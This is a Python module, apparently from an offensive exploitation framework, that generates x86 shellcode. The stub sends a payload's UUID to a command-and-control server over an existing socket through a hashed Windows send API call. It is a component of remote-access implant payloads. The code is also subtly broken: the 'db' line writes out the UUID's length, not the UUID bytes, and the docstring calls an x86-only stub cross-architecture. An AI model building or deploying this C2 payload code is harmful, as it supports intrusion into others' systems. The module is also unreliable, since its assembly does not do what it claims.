"""
Terasploit Framework (c) 2026

Author:          4steroth
License:         BSD-3-Clause
Path:            teralibs/tsf/core/payload/windows/x86/send_uuid_x86.py
"""

from teralibs.tsf.core.payload.uuid.options import PayloadUUIDOptions
from teralibs.tsf.core.payload.windows.x86.block_api_x86 import BlockApiX86


class SendUUIDX86(BlockApiX86, PayloadUUIDOptions):
    """
    Implements a cross-architecture NASM stub to transmit a unique
    payload identifier (UUID) to the C2 server over an existing socket.
    """

    def asm_send_uuid(self, uuid=None):
        """
        Generates assembly code to send a UUID over a socket using the Windows WS2_32 'send' API.
        """
        if uuid is None:
            uuid = self.generate_payload_uuid()

        uuid_raw = uuid.to_raw()
        uuid_len = len(uuid_raw)

        asm = f"""
            send_uuid:
                push 0                 ; flags
                push 0x{uuid_len:x}
                call get_uuid_address  ; put uuid buffer on the stack

                db 0x{len(uuid.to_raw()):x}  ; UUID

            get_uuid_address:
                push edi               ; saved socket

                push {self.block_api_hash("ws2_32.dll", "send")}

                call ebp               ; call send
        """
        return asm

    @staticmethod
    def uuid_required_size() -> int:
        """
        Returns the byte requirements for this stub.
        """
        # Start with the number of bytes required for the instructions
        space = 17

        # a UUID is 16 bytes
        space += 16

        return space
